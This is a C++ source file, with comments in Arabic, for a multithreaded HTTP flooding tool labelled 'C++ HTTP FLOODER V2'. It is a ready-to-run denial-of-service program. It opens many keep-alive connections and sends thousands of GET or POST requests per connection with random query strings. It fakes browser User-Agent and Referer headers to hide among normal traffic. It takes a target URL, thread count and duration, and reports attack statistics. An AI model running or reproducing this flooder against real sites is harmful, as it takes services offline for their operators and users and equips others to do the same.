/**
 * Advanced HTTP Flooder - C++ Implementation (OPTIMIZED V2)
 * 
 * تحسينات:
 * - قراءة الـ HTTP response الفعلية للتأكد من نجاح الطلب
 * - إبقاء الاتصالات مفتوحة لأطول فترة ممكنة (Keep-Alive حقيقي)
 * - TLS session reuse لتقليل overhead
 * - إزالة sleep غير الضروري
 * - إحصائيات دقيقة مع response codes
 * - توليد فوري للـ random headers بدون إعادة حساب
 */

#include <iostream>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <chrono>
#include <fstream>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <cstring>
#include <sstream>
#include <algorithm>
#include <functional>
#include <future>
#include <unordered_map>

// Network related includes
#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define CLOSE_SOCKET closesocket
    typedef SOCKET socket_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <sys/types.h>
    #include <netinet/tcp.h>
    #define CLOSE_SOCKET close
    #define SOCKET_ERROR -1
    typedef int socket_t;
#endif

// OpenSSL for HTTPS
#include <openssl/ssl.h>
#include <openssl/err.h>

// ============ إعدادات قابلة للتعديل ============
constexpr int MAX_REQUESTS_PER_CONNECTION = 50000; // 50k طلب لكل اتصال بدلاً من 100
constexpr int CONNECTION_TIMEOUT_SEC = 10;
constexpr int RECV_BUFFER_SIZE = 8192;

// ============ متغيرات عالمية للتحكم ============
std::atomic<bool> running(false);
std::condition_variable cv_start;
std::mutex mtx_start;
std::mutex mtx_console;

// ============ Color ============
#ifdef _WIN32
    #include <windows.h>
    void setColor(int color) {
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, color);
    }
#else
    void setColor(int color) {
        switch(color) {
            case 12: std::cout << "\033[31m"; break;
            case 10: std::cout << "\033[32m"; break;
            case 9:  std::cout << "\033[34m"; break;
            case 14: std::cout << "\033[33m"; break;
            case 13: std::cout << "\033[35m"; break;
            case 11: std::cout << "\033[36m"; break;
            case 15: std::cout << "\033[0m";  break;
            default: std::cout << "\033[0m";  break;
        }
    }
#endif

// ============ Cache للـ DNS + TLS Sessions ============
struct ConnectionPool {
    struct addrinfo* addr_info;
    SSL_CTX* ssl_ctx;
    std::string host;
    std::string port;
    bool useSSL;
    
    ConnectionPool(const std::string& h, const std::string& p, bool ssl) 
        : addr_info(nullptr), ssl_ctx(nullptr), host(h), port(p), useSSL(ssl) {
        
        // DNS resolution مرة واحدة فقط
        struct addrinfo hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        if (getaddrinfo(host.c_str(), port.c_str(), &hints, &addr_info) != 0) {
            throw std::runtime_error("DNS resolution failed");
        }
        
        // SSL context لمرة واحدة فقط
        if (useSSL) {
            ssl_ctx = SSL_CTX_new(SSLv23_client_method());
            SSL_CTX_set_options(ssl_ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
            SSL_CTX_set_mode(ssl_ctx, SSL_MODE_AUTO_RETRY);
            SSL_CTX_set_session_cache_mode(ssl_ctx, SSL_SESS_CACHE_CLIENT);
        }
    }
    
    ~ConnectionPool() {
        if (addr_info) freeaddrinfo(addr_info);
        if (ssl_ctx) SSL_CTX_free(ssl_ctx);
    }
};

// ============ الفلودر الأساسي ============
class HTTPFlooder {
private:
    std::string host;
    std::string port;
    std::string page;
    std::string mode;
    std::string key;
    std::string customHeaders;
    int threadCount;
    int duration;
    bool useSSL;
    
    ConnectionPool pool;
    
    // إحصائيات دقيقة
    std::atomic<uint64_t> sendCount{0};
    std::atomic<uint64_t> successCount{0};     // HTTP 2xx
    std::atomic<uint64_t> failCount{0};        // فشل في الاتصال أو الإرسال
    std::atomic<uint64_t> httpErrorCount{0};   // HTTP 4xx, 5xx
    std::atomic<uint64_t> bytesSent{0};
    std::atomic<int> activeConnections{0};
    
    std::mt19937 gen;
    std::random_device rd;
    
    // Pre-generated headers cache لتسريع
    std::vector<std::string> userAgentCache;
    std::vector<std::string> refererCache;
    std::vector<std::string> acceptCache;
    
    const std::string alphanum = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    
public:
    HTTPFlooder(const std::string& targetUrl, const std::string& requestMode, 
                int threads, int timeLimit, const std::string& headerFile) 
        : threadCount(threads), duration(timeLimit), gen(rd()), 
          pool("1.1.1.1", "80", false) { 
        
        parseURL(targetUrl); 
        pool.~ConnectionPool(); 
        new (&pool) ConnectionPool(host, port, useSSL);
        
        mode = requestMode;
        
        if (headerFile != "nil") {
            loadHeadersFromFile(headerFile);
        }
        
        // Pre-cache headers
        preCacheHeaders();
        
        // Initialize OpenSSL
        if (useSSL) {
            SSL_library_init();
            SSL_load_error_strings();
            OpenSSL_add_all_algorithms();
        }
        
        #ifdef _WIN32
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        #endif
    }
    
    ~HTTPFlooder() {
        if (useSSL) {
            ERR_free_strings();
            EVP_cleanup();
        }
        #ifdef _WIN32
        WSACleanup();
        #endif
    }
    
    void start() {
        std::vector<std::thread> threads;
        threads.reserve(threadCount);
        
        printBanner();
        
        for (int i = 0; i < threadCount; ++i) {
            threads.emplace_back(&HTTPFlooder::floodWorker, this);
            std::this_thread::sleep_for(std::chrono::microseconds(100));
        }
        
        std::cout << "\nAll " << threadCount << " threads ready!" << std::endl;
        std::cout << "Press [Enter] to start..." << std::flush;
        std::cin.get();
        
        std::cout << "\nAttack started for " << duration << " seconds" << std::endl;
        
        {
            std::lock_guard<std::mutex> lock(mtx_start);
            running = true;
        }
        cv_start.notify_all();
        
        std::thread statsThread(&HTTPFlooder::monitorStats, this);
        
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        running = false;
        
        for (auto& t : threads) {
            if (t.joinable()) t.join();
        }
        if (statsThread.joinable()) statsThread.join();
        
        printFinalStats();
    }
    
private:
    void parseURL(const std::string& url) {
        size_t protocolEnd = url.find("://");
        if (protocolEnd != std::string::npos) {
            std::string protocol = url.substr(0, protocolEnd);
            useSSL = (protocol == "https");
        } else {
            useSSL = false;
            protocolEnd = -3;
        }
        
        size_t hostStart = protocolEnd + 3;
        size_t pathStart = url.find('/', hostStart);
        
        if (pathStart != std::string::npos) {
            host = url.substr(hostStart, pathStart - hostStart);
            page = url.substr(pathStart);
        } else {
            host = url.substr(hostStart);
            page = "/";
        }
        
        size_t portStart = host.find(':');
        if (portStart != std::string::npos) {
            port = host.substr(portStart + 1);
            host = host.substr(0, portStart);
        } else {
            port = useSSL ? "443" : "80";
        }
        
        key = (page.find('?') != std::string::npos) ? "&" : "?";
    }
    
    void loadHeadersFromFile(const std::string& filename) {
        std::ifstream file(filename);
        if (file.is_open()) {
            std::stringstream buffer;
            buffer << file.rdbuf();
            customHeaders = buffer.str();
        }
    }
    
    void preCacheHeaders() {
        const int CACHE_SIZE = 500;
        userAgentCache.reserve(CACHE_SIZE);
        refererCache.reserve(CACHE_SIZE);
        acceptCache.reserve(CACHE_SIZE);
        
        for (int i = 0; i < CACHE_SIZE; ++i) {
            userAgentCache.push_back(generateUserAgent());
            refererCache.push_back(generateReferer());
            acceptCache.push_back(generateAcceptHeader());
        }
    }
    
    std::string generateUserAgent() {
        std::vector<std::string> platforms = {"Macintosh", "Windows", "X11", "Linux"};
        std::uniform_int_distribution<> dist(0, platforms.size() - 1);
        std::string plat = platforms[dist(gen)];
        std::string os;
        
        if (plat == "Windows") {
            std::vector<std::string> wins = {"Windows NT 10.0; Win64; x64", "Windows NT 6.1; Win64; x64", "Windows NT 6.2", "Windows NT 10.0"};
            os = wins[std::uniform_int_distribution<>(0, wins.size()-1)(gen)];
        } else if (plat == "Macintosh") {
            os = "Intel Mac OS X 10_" + std::to_string(std::uniform_int_distribution<>(10, 15)(gen)) + "_" + std::to_string(std::uniform_int_distribution<>(0, 9)(gen));
        } else {
            os = "X11; Linux x86_64";
        }
        
        std::stringstream ua;
        ua << "Mozilla/5.0 (" << os << ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
           << std::uniform_int_distribution<>(90, 120)(gen) << ".0."
           << std::uniform_int_distribution<>(4000, 5000)(gen) << "."
           << std::uniform_int_distribution<>(100, 200)(gen) << " Safari/537.36";
        return ua.str();
    }
    
    std::string generateReferer() {
        std::vector<std::string> refs = {
            "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
            "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
            "https://www.linkedin.com/", "https://github.com/", "https://stackoverflow.com/",
            "https://www.youtube.com/"
        };
        return refs[std::uniform_int_distribution<>(0, refs.size()-1)(gen)];
    }
    
    std::string generateAcceptHeader() {
        std::vector<std::string> accepts = {
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "application/json,text/plain,*/*"
        };
        return accepts[std::uniform_int_distribution<>(0, accepts.size()-1)(gen)];
    }
    
    std::string craftHTTPRequest() {
        std::stringstream request;
        std::uniform_int_distribution<> cacheDist(0, 499);
        
        if (mode == "get") {
            std::string randParam;
            randParam += alphanum[std::uniform_int_distribution<>(0, alphanum.size()-1)(gen)];
            randParam += alphanum[std::uniform_int_distribution<>(0, alphanum.size()-1)(gen)];
            randParam += alphanum[std::uniform_int_distribution<>(0, alphanum.size()-1)(gen)];
            randParam += alphanum[std::uniform_int_distribution<>(0, alphanum.size()-1)(gen)];
            
            request << "GET " << page << key << randParam << "=" << std::uniform_int_distribution<>(0, 99999999)(gen) << " HTTP/1.1\r\n";
            request << "Host: " << host << "\r\n";
            request << "User-Agent: " << userAgentCache[cacheDist(gen)] << "\r\n";
            request << "Accept: " << acceptCache[cacheDist(gen)] << "\r\n";
            request << "Referer: " << refererCache[cacheDist(gen)] << "\r\n";
            request << "Connection: keep-alive\r\n";
            request << "Accept-Encoding: gzip, deflate\r\n";
            request << "Accept-Language: en-US,en;q=0.9\r\n\r\n";
        } else {
            std::string data = "f=" + randomString(4);
            request << "POST " << page << " HTTP/1.1\r\n";
            request << "Host: " << host << "\r\n";
            request << "User-Agent: " << userAgentCache[cacheDist(gen)] << "\r\n";
            request << "Accept: " << acceptCache[cacheDist(gen)] << "\r\n";
            request << "Referer: " << refererCache[cacheDist(gen)] << "\r\n";
            request << "Connection: keep-alive\r\n";
            request << "Content-Type: application/x-www-form-urlencoded\r\n";
            request << "Content-Length: " << data.length() << "\r\n\r\n";
            request << data;
        }
        
        return request.str();
    }
    
    std::string randomString(int len) {
        std::string result;
        result.reserve(len);
        for (int i = 0; i < len; ++i) {
            result += alphanum[std::uniform_int_distribution<>(0, alphanum.size()-1)(gen)];
        }
        return result;
    }
    
    socket_t createSocket() {
        socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == SOCKET_ERROR) return SOCKET_ERROR;
        
        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&flag, sizeof(flag));
        
        // Set socket timeout
        struct timeval tv;
        tv.tv_sec = CONNECTION_TIMEOUT_SEC;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&tv, sizeof(tv));
        
        return sock;
    }
    
    bool connectSocket(socket_t sock) {
        if (connect(sock, pool.addr_info->ai_addr, pool.addr_info->ai_addrlen) != 0) {
            return false;
        }
        return true;
    }
    
    SSL* createSSL(socket_t sock) {
        if (!useSSL) return nullptr;
        
        SSL* ssl = SSL_new(pool.ssl_ctx);
        if (!ssl) return nullptr;
        
        SSL_set_fd(ssl, sock);
        SSL_set_tlsext_host_name(ssl, host.c_str());
        
        if (SSL_connect(ssl) != 1) {
            SSL_free(ssl);
            return nullptr;
        }
        
        return ssl;
    }
    
    int sendRaw(socket_t sock, SSL* ssl, const char* data, size_t len) {
        if (useSSL) {
            return SSL_write(ssl, data, len);
        }
        return send(sock, data, len, 0);
    }
    
    int recvRaw(socket_t sock, SSL* ssl, char* buf, size_t len) {
        if (useSSL) {
            return SSL_read(ssl, buf, len);
        }
        return recv(sock, buf, len, 0);
    }
    
    bool readHTTPResponse(socket_t sock, SSL* ssl) {
        char buffer[RECV_BUFFER_SIZE];
        int totalRead = 0;
        bool headerComplete = false;
        std::string responseHeader;
        
        auto startTime = std::chrono::steady_clock::now();
        
        while (!headerComplete && running) {
            // Timeout check
            auto now = std::chrono::steady_clock::now();
            if (std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count() > 5) {
                return false; // timeout
            }
            
            int bytes = recvRaw(sock, ssl, buffer, sizeof(buffer) - 1);
            if (bytes <= 0) {
                return false;
            }
            
            buffer[bytes] = '\0';
            responseHeader.append(buffer, bytes);
            totalRead += bytes;
            
            // Check for end of headers
            size_t headerEnd = responseHeader.find("\r\n\r\n");
            if (headerEnd != std::string::npos) {
                headerComplete = true;
                
                // تحليل status code
                size_t space1 = responseHeader.find(' ');
                size_t space2 = responseHeader.find(' ', space1 + 1);
                if (space1 != std::string::npos && space2 != std::string::npos) {
                    std::string statusStr = responseHeader.substr(space1 + 1, space2 - space1 - 1);
                    int statusCode = std::stoi(statusStr);
                    
                    if (statusCode >= 200 && statusCode < 300) {
                        return true;  // نجاح ✅
                    } else {
                        httpErrorCount++;
                        return false; // خطأ HTTP (4xx, 5xx)
                    }
                }
                return true;
            }
            
            // Prevent reading too much data (safety)
            if (totalRead > 1024 * 1024) { // 1MB limit
                return false;
            }
        }
        
        return headerComplete;
    }
    
    void floodWorker() {
        {
            std::unique_lock<std::mutex> lock(mtx_start);
            cv_start.wait(lock, []{ return running.load(); });
        }
        
        while (running) {
            socket_t sock = SOCKET_ERROR;
            SSL* ssl = nullptr;
            
            try {
                // إنشاء اتصال واحد
                sock = createSocket();
                if (sock == SOCKET_ERROR) {
                    failCount++;
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                    continue;
                }
                
                if (!connectSocket(sock)) {
                    CLOSE_SOCKET(sock);
                    failCount++;
                    std::this_thread::sleep_for(std::chrono::milliseconds(50));
                    continue;
                }
                
                ssl = createSSL(sock);
                
                activeConnections++;
                
                // إرسال آلاف الطلبات على نفس الاتصال
                int reqThisConn = 0;
                while (running && reqThisConn < MAX_REQUESTS_PER_CONNECTION) {
                    std::string request = craftHTTPRequest();
                    
                    if (sendRaw(sock, ssl, request.c_str(), request.length()) <= 0) {
                        failCount++;
                        break; // الاتصال انقطع، نعيد اتصال جديد
                    }
                    
                    sendCount++;
                    bytesSent += request.length();
                    
                    // قراءة الـ response الفعلية
                    if (readHTTPResponse(sock, ssl)) {
                        successCount++;
                    } else {
                        // الفشل ممكن يكون بسبب response خطأ أو انقطاع الاتصال
                        failCount++;
                    }
                    
                    reqThisConn++;
                }
                
            } catch (...) {
                failCount++;
            }
            
            // تنظيف
            if (ssl) {
                SSL_shutdown(ssl);
                SSL_free(ssl);
            }
            if (sock != SOCKET_ERROR) {
                CLOSE_SOCKET(sock);
            }
            activeConnections--;
        }
    }
    
    void monitorStats() {
        auto startTime = std::chrono::steady_clock::now();
        uint64_t lastSent = 0;
        uint64_t lastSuccess = 0;
        
        while (running) {
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::steady_clock::now() - startTime).count();
            
            if (elapsed > 0) {
                uint64_t curSent = sendCount.load();
                uint64_t curSuccess = successCount.load();
                uint64_t rps = (curSent - lastSent);
                uint64_t sps = (curSuccess - lastSuccess);
                lastSent = curSent;
                lastSuccess = curSuccess;
                
                std::lock_guard<std::mutex> lock(mtx_console);
                setColor(11);
                std::cout << "\r[" << elapsed << "s] ";
                setColor(10);
                std::cout << "Sent: " << curSent << " (" << rps << "/s) ";
                setColor(9);
                std::cout << "OK: " << curSuccess << " (" << sps << "/s) ";
                setColor(12);
                std::cout << "Failed: " << failCount.load() << " ";
                setColor(14);
                std::cout << "Active: " << activeConnections.load() << " ";
                setColor(13);
                std::cout << "MB: " << (bytesSent.load() / (1024*1024)) << "    ";
                setColor(15);
                std::cout << std::flush;
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
    
    void printBanner() {
        std::lock_guard<std::mutex> lock(mtx_console);
        setColor(12);
        std::cout << R"(
   ▄█    █▄     ▄████████ ███    █▄     ▄████████ ▀█████████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄  
  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ 
  ███    ███   ███    ███ ███    ███   ███    █▀    ███    ███ ███    ███ ███   ███   ███   ███    ███ 
 ▄███▄▄▄▄███▄▄ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███ ███   ███   ███  ▄███▄▄▄██▀  
▀▀███▀▀▀▀███▀  ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  
  ███    ███   ███    ███ ███    ███   ███    █▄    ███    ██▄ ███    ███ ███   ███   ███   ███    ██▄ 
  ███    ███   ███    ███ ███    ███   ███    ███   ███    ███ ███    ███ ███   ███   ███   ███    ███ 
  ███    █▀    ███    █▀  ████████▀    ██████████ ▄█████████▀   ▀██████▀  ▀█   ███   █▀  ▄█████████▀  

                     C++ HTTP FLOODER V2 - OPTIMIZED
)" << std::endl;
        setColor(14);
        std::cout << "Target: " << (useSSL ? "https://" : "http://") << host << ":" << port << page << std::endl;
        std::cout << "Mode: " << mode << " | Threads: " << threadCount << " | Duration: " << duration << "s" << std::endl;
        std::cout << "Requests/Connection: " << MAX_REQUESTS_PER_CONNECTION << std::endl;
        setColor(15);
    }
    
    void printFinalStats() {
        auto elapsed = duration;
        
        std::lock_guard<std::mutex> lock(mtx_console);
        setColor(10);
        std::cout << "\n\n========== FINAL STATISTICS ==========" << std::endl;
        setColor(11);
        std::cout << "Duration: " << elapsed << " seconds" << std::endl;
        std::cout << "Total Sent: " << sendCount.load() << std::endl;
        setColor(10);
        std::cout << "Successful (2xx): " << successCount.load() << std::endl;
        setColor(12);
        std::cout << "Failed: " << failCount.load() << std::endl;
        setColor(14);
        std::cout << "HTTP Errors (4xx/5xx): " << httpErrorCount.load() << std::endl;
        setColor(13);
        std::cout << "Data Transferred: " << (bytesSent.load() / (1024*1024)) << " MB" << std::endl;
        setColor(11);
        std::cout << "Average RPS: " << (elapsed > 0 ? sendCount.load() / elapsed : 0) << std::endl;
        std::cout << "Effective RPS (2xx): " << (elapsed > 0 ? successCount.load() / elapsed : 0) << std::endl;
        setColor(10);
        std::cout << "====================================" << std::endl;
        setColor(15);
    }
};

void printUsage(const char* name) {
    std::cerr << "Usage: " << name << " <url> <threads> <get/post> <seconds> <header_file/nil>" << std::endl;
    std::cerr << "Example: " << name << " http://example.com 200 get 60 nil" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        printUsage(argv[0]);
        return 1;
    }
    
    try {
        HTTPFlooder flooder(argv[1], argv[3], std::stoi(argv[2]), std::stoi(argv[4]), argv[5]);
        flooder.start();
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}